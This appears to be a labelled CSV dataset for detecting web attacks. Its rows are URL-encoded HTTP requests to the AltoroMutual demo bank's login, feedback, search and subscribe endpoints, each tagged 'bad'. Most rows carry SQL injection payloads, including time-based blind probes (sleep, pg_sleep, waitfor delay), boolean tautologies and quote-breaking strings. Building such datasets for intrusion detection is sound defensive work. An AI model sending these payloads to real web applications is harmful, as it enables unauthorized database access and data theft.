148,POST,b'cfile=comments.txt%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
149,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%2255',0,4,0,0,2,0,bad
150,GET,b'',b'/survey_questions.jsp?step=1%27%22',1,1,0,0,0,0,bad
151,POST,b'btnSubmit=Login&passw=1%27%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
152,POST,b'btnSubmit=Login%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
153,POST,b'cfile=comments.txt&comments=%5c&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
154,POST,b'btnSubmit=Subscribe&txtEmail=%5c',b'/doSubscribe',0,0,0,0,0,0,bad
155,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d17',0,0,0,0,2,0,bad
156,POST,b'btnSubmit=Subscribe%22%20and%20sleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,2,1,bad
157,GET,b'',b'/high_yield_investments%22%20and%20sleep%284%29%3d%22.htm',0,2,0,1,2,1,bad
158,POST,b'cfile=comments.txt%22%20and%20sleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
159,POST,b'btnSubmit=Login&passw=%5c&uid=1',b'/doLogin',0,0,0,0,0,1,bad
160,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%220',0,4,0,0,2,0,bad
161,POST,b'btnSubmit=Login%22%20and%20sleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,2,2,bad
162,POST,b'cfile=comments.txt&comments=1%c0%00xa7%c0%a2&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
163,POST,b'btnSubmit=Subscribe&txtEmail=1%c0%00xa7%c0%a2',b'/doSubscribe',0,0,0,0,0,0,bad
164,GET,b'',b'/high_yield_investments%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
165,POST,b'btnSubmit=Subscribe%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
166,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d0',0,0,0,0,2,0,bad
167,GET,b'',b'/search.jsp?query=-1%22%20or%2055-53%20%3d%20%222',0,2,0,0,4,0,bad
168,POST,b'btnSubmit=Login&passw=1%c0%00xa7%c0%a2&uid=1',b'/doLogin',0,0,0,0,0,1,bad
169,POST,b'btnSubmit=Login%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
170,POST,b'cfile=comments.txt&comments=%40%40vvzyt&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
171,GET,b'',b'/survey_questions.jsp?step=%5c',0,0,0,0,0,0,bad
172,POST,b'btnSubmit=Subscribe&txtEmail=%40%40UM0Vt',b'/doSubscribe',0,0,0,0,0,0,bad
173,POST,b'btnSubmit=Subscribe%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,1,1,2,6,1,bad
174,GET,b'',b'/high_yield_investments%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,1,1,2,6,1,bad
175,POST,b'cfile=comments.txt%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
176,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%2746',4,0,0,0,2,0,bad
177,GET,b'',b'/search.jsp?query=1%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
178,POST,b'btnSubmit=Login&passw=%40%40WI5vh&uid=1',b'/doLogin',0,0,0,0,0,1,bad
179,POST,b'btnSubmit=Login%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,1,1,2,6,2,bad
180,POST,b'cfile=comments.txt&comments=JyI%3d&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
181,GET,b'',b'/survey_questions.jsp?step=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
182,POST,b'btnSubmit=Subscribe&txtEmail=JyI%3d',b'/doSubscribe',0,0,0,0,0,0,bad
183,GET,b'',b'/high_yield_investments%27%3dsleep%284%29%3d%27.htm',2,0,0,1,0,1,bad
184,POST,b'cfile=comments.txt%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
185,POST,b'btnSubmit=Subscribe%27%3dsleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,0,1,bad
186,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%270',4,0,0,0,2,0,bad
187,POST,b'btnSubmit=Login&passw=JyI%3d&uid=1',b'/doLogin',0,0,0,0,0,1,bad
188,GET,b'',b'/search.jsp?query=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
189,POST,b'btnSubmit=Login%27%3dsleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,0,2,bad
190,POST,b'btnSubmit=Subscribe&txtEmail=%bf%27%bf%22',b'/doSubscribe',1,1,0,0,0,0,bad
191,POST,b'cfile=comments.txt&comments=%bf%27%bf%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
192,GET,b'',b'/survey_questions.jsp?step=%40%40RBDGS',0,0,0,0,0,0,bad
193,POST,b'btnSubmit=Subscribe%22%3dsleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,0,1,bad
194,GET,b'',b'/high_yield_investments%22%3dsleep%284%29%3d%22.htm',0,2,0,1,0,1,bad
195,POST,b'cfile=comments.txt%27%3dsleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
196,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%22108',0,4,0,0,2,0,bad
197,POST,b'btnSubmit=Login&passw=%bf%27%bf%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
198,GET,b'',b'/search.jsp?query=1%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
199,POST,b'btnSubmit=Login%22%3dsleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,0,2,bad
200,POST,b'cfile=comments.txt&comments=%f0%27%27%f0%22%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
201,GET,b'',b'/survey_questions.jsp?step=JyI%3d',0,0,0,0,0,0,bad
202,POST,b'btnSubmit=Subscribe&txtEmail=%f0%27%27%f0%22%22',b'/doSubscribe',2,2,0,0,0,0,bad
203,POST,b'btnSubmit=Subscribe%20and%20sleep%284%29%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,1,3,1,bad
204,GET,b'',b'/high_yield_investments%20and%20sleep%284%29%20.htm',0,0,0,1,3,1,bad
205,POST,b'cfile=comments.txt%22%3dsleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
206,POST,b'btnSubmit=Login&passw=%f0%27%27%f0%22%22&uid=1',b'/doLogin',2,2,0,0,0,1,bad
207,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%220',0,4,0,0,2,0,bad
208,GET,b'',b'/search.jsp?query=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
209,POST,b'btnSubmit=Login%20and%20sleep%284%29%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,1,3,2,bad
210,POST,b'cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
211,GET,b'',b'/survey_questions.jsp?step=%bf%27%bf%22',1,1,0,0,0,0,bad
212,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
213,POST,b'btnSubmit=Subscribe%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,1,2,6,1,bad
214,GET,b'',b'/high_yield_investments%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,0,1,2,6,1,bad
215,POST,b'cfile=comments.txt%20and%20sleep%284%29%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
216,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
217,POST,b'btnSubmit=Login%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,1,2,6,2,bad
218,GET,b'',b'/search.jsp?query=1%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
219,POST,b'cfile=comments.txt&comments=1&email_addr=1%27%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
220,GET,b'',b'/survey_questions.jsp?step=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
221,POST,b'btnSubmit=Subscribe%27%3bselect%20pg_sleep%284%29%3b%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,1,3,2,bad
222,POST,b'cfile=comments.txt%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
223,GET,b'',b'/high_yield_investments%27%3bselect%20pg_sleep%284%29%3b%20--%20.htm',1,0,1,1,3,2,bad
224,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%27%22',b'/doLogin',1,1,0,0,0,1,bad
225,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
226,POST,b'btnSubmit=Login%27%3bselect%20pg_sleep%284%29%3b%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,1,3,3,bad
227,POST,b'cfile=comments.txt&comments=1&email_addr=%5c&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
228,GET,b'',b'/search.jsp?query=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
229,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
230,GET,b'',b'/swagger/-1%20or%2087%3d87.html',0,0,0,0,2,0,bad
231,POST,b'btnSubmit=Subscribe%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',3,0,1,0,5,2,bad
232,POST,b'cfile=comments.txt%27%3bselect%20pg_sleep%284%29%3b%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
233,GET,b'',b'/high_yield_investments%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',3,0,1,0,5,2,bad
234,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%5c',b'/doLogin',0,0,0,0,0,1,bad
235,GET,b'',b'/survey_questions.jsp?step=b%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
236,POST,b'btnSubmit=Login%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',3,0,1,0,5,3,bad
237,POST,b'cfile=comments.txt&comments=1&email_addr=1%c0%00xa7%c0%a2&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
238,GET,b'',b'/search.jsp?query=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
239,GET,b'',b'/swagger/1%27%22.html',1,1,0,0,0,0,bad
240,GET,b'',b'/swagger/-1%20or%2087%3d0.html',0,0,0,0,2,0,bad
241,POST,b'btnSubmit=Subscribe%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',2,1,1,0,5,2,bad
242,POST,b'cfile=comments.txt%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',3,0,1,0,7,2,bad
243,GET,b'',b'/high_yield_investments%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',2,1,1,0,5,2,bad
244,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%c0%00xa7%c0%a2',b'/doLogin',0,0,0,0,0,1,bad
245,GET,b'',b'/survey_questions.jsp?step=b%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
246,POST,b'btnSubmit=Login%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',2,1,1,0,5,3,bad
247,POST,b'cfile=comments.txt&comments=1&email_addr=%40%40oaAzP&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
248,GET,b'',b'/search.jsp?query=1%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
249,GET,b'',b'/swagger/%5c.html',0,0,0,0,0,0,bad
250,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%2749.html',4,0,0,0,2,0,bad
251,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
252,POST,b'cfile=comments.txt%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,1,1,0,7,2,bad
253,GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
254,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%40%40lWExv',b'/doLogin',0,0,0,0,0,1,bad
255,GET,b'',b'/survey_questions.jsp?step=b%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
256,GET,b'',b'/search.jsp?query=1%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
257,GET,b'',b'/swagger/1%c0%00xa7%c0%a2.html',0,0,0,0,0,0,bad
258,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%270.html',4,0,0,0,2,0,bad
259,POST,b'cfile=comments.txt&comments=1&email_addr=JyI%3d&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
260,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=JyI%3d',b'/doLogin',0,0,0,0,0,1,bad
261,GET,b'',b'/survey_questions.jsp?step=b%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
262,GET,b'',b'/search.jsp?query=1%3bselect%20pg_sleep%284%29%3b%20--%20',0,0,1,1,3,2,bad
263,GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%2238.html',0,4,0,0,2,0,bad
264,GET,b'',b'/swagger/%40%404gjm0.html',0,0,0,0,0,0,bad
265,POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d99',b'/doSubscribe',0,0,0,0,2,0,bad
266,POST,b'cfile=comments.txt&comments=1&email_addr=%bf%27%bf%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
267,GET,b'',b'/index.jsp?content=-1%20or%2050%3d50',0,0,0,0,2,0,bad
268,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%bf%27%bf%22',b'/doLogin',1,1,0,0,0,1,bad
269,GET,b'',b'/survey_questions.jsp?step=b%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
270,POST,b'btnSubmit=Login&passw=-1%20or%2071%3d71&uid=1',b'/doLogin',0,0,0,0,2,1,bad
271,GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%220.html',0,4,0,0,2,0,bad
272,GET,b'',b'/search.jsp?query=1%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
273,POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d0',b'/doSubscribe',0,0,0,0,2,0,bad
274,POST,b'cfile=comments.txt&comments=-1%20or%20108%3d108&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
275,GET,b'',b'/swagger/JyI%3d.html',0,0,0,0,0,0,bad
276,POST,b'cfile=comments.txt&comments=1&email_addr=%f0%27%27%f0%22%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,0,0,bad
277,GET,b'',b'/index.jsp?content=-1%20or%2050%3d0',0,0,0,0,2,0,bad
278,GET,b'',b'/survey_questions.jsp?step=b%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
279,POST,b'btnSubmit=Login&passw=-1%20or%2071%3d0&uid=1',b'/doLogin',0,0,0,0,2,1,bad
280,POST,b'cfile=comments.txt&comments=-1%20or%20108%3d0&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
281,POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%2720',b'/doSubscribe',4,0,0,0,2,0,bad
282,GET,b'',b'/search.jsp?query=1%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,0,1,0,5,2,bad
283,GET,b'',b'/swagger/index%27%20and%20sleep%284%29%3d%27.html',2,0,0,1,2,1,bad
284,GET,b'',b'/swagger/%bf%27%bf%22.html',1,1,0,0,0,0,bad
285,GET,b'',b'/index.jsp?content=-1%20or%2050-48%20%3d%202',0,0,0,0,4,0,bad
286,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%f0%27%27%f0%22%22',b'/doLogin',2,2,0,0,0,1,bad
287,GET,b'',b'/survey_questions.jsp?step=b%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
288,POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%2797&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
289,POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%2719&uid=1',b'/doLogin',4,0,0,0,2,1,bad
290,POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%270',b'/doSubscribe',4,0,0,0,2,0,bad
291,GET,b'',b'/swagger/%f0%27%27%f0%22%22.html',2,2,0,0,0,0,bad
292,GET,b'',b'/search.jsp?query=1%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
293,GET,b'',b'/swagger/index%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
294,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%27%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
295,GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%2720',4,0,0,0,2,0,bad
296,GET,b'',b'/index.jsp?content=business_other.htm',0,0,0,0,0,0,bad
297,GET,b'',b'/survey_questions.jsp?step=b%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
298,POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%270&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
299,POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%270&uid=1',b'/doLogin',4,0,0,0,2,1,bad
300,POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%2289',b'/doSubscribe',0,4,0,0,2,0,bad
301,GET,b'',b'/swagger/index%22%20and%20sleep%284%29%3d%22.html',0,2,0,1,2,1,bad
302,GET,b'',b'/search.jsp?query=1%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
303,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
304,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%5c&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
305,GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%270',4,0,0,0,2,0,bad
306,GET,b'',b'/index.jsp?content=1%27%22',1,1,0,0,0,0,bad
307,POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%2236&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
308,GET,b'',b'/survey_questions.jsp?step=b%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
309,POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%220',b'/doSubscribe',0,4,0,0,2,0,bad
310,POST,b'btnSubmit=Login&passw=-1%27%20or%2019-17%20%3d%20%272&uid=1',b'/doLogin',2,0,0,0,4,1,bad
311,GET,b'',b'/swagger/index%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
312,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
313,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%c0%00xa7%c0%a2&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
314,GET,b'',b'/index.jsp?content=-1%27%20or%2020-18%20%3d%20%272',2,0,0,0,4,0,bad
315,GET,b'',b'/index.jsp?content=%5c',0,0,0,0,0,0,bad
316,POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%220&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
317,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20sleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,2,1,bad
318,GET,b'',b'/survey_questions.jsp?step=b%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
319,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d58',0,0,0,0,2,0,bad
320,POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%2222&uid=1',b'/doLogin',0,4,0,0,2,1,bad
321,GET,b'',b'/swagger/index%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,1,1,2,6,1,bad
322,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%27%22',1,1,0,0,0,0,bad
323,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%40%40lGkk0&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
324,GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%2225',0,4,0,0,2,0,bad
325,GET,b'',b'/index.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
326,POST,b'cfile=comments.txt&comments=1%20and%20sleep%284%29%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
327,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
328,POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%220&uid=1',b'/doLogin',0,4,0,0,2,1,bad
329,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d0',0,0,0,0,2,0,bad
330,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
331,GET,b'',b'/swagger/index%27%3dsleep%284%29%3d%27.html',2,0,0,1,0,1,bad
332,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%5c',0,0,0,0,0,0,bad
333,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=JyI%3d&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
334,GET,b'',b'/index.jsp?content=%40%40ussS4',0,0,0,0,0,0,bad
335,GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%220',0,4,0,0,2,0,bad
336,POST,b'cfile=comments.txt&comments=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
337,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20and%20sleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,2,1,bad
338,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20sleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,2,2,bad
339,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058-56%20%3d%202',0,0,0,0,4,0,bad
340,GET,b'',b'/swagger/index%22%3dsleep%284%29%3d%22.html',0,2,0,1,0,1,bad
341,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
342,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%bf%27%bf%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
343,GET,b'',b'/index.jsp?content=JyI%3d',0,0,0,0,0,0,bad
344,GET,b'',b'/index.jsp?content=-1%22%20or%2025-23%20%3d%20%222',0,2,0,0,4,0,bad
345,POST,b'cfile=comments.txt&comments=1%27%20and%20sleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
346,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
347,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%2719',4,0,0,0,2,0,bad
348,GET,b'',b'/swagger/index%20and%20sleep%284%29%20.html',0,0,0,1,3,1,bad
349,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
350,GET,b'',b'/default.jsp?content=-1%20or%2032%3d32',0,0,0,0,2,0,bad
351,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%40%40VprZK',0,0,0,0,0,0,bad
352,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%f0%27%27%f0%22%22&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
353,GET,b'',b'/index.jsp?content=%bf%27%bf%22',1,1,0,0,0,0,bad
354,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
355,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,1,1,2,6,1,bad
356,POST,b'cfile=comments.txt&comments=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
357,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%270',4,0,0,0,2,0,bad
358,GET,b'',b'/swagger/index%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,0,1,2,6,1,bad
359,GET,b'',b'/default.jsp?content=-1%20or%2032%3d0',0,0,0,0,2,0,bad
360,POST,b'btnSubmit=Login&passw=acUn3t1x%22%20and%20sleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,2,2,bad
361,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=JyI%3d',0,0,0,0,0,0,bad
362,GET,b'',b'/index.jsp?content=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
363,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
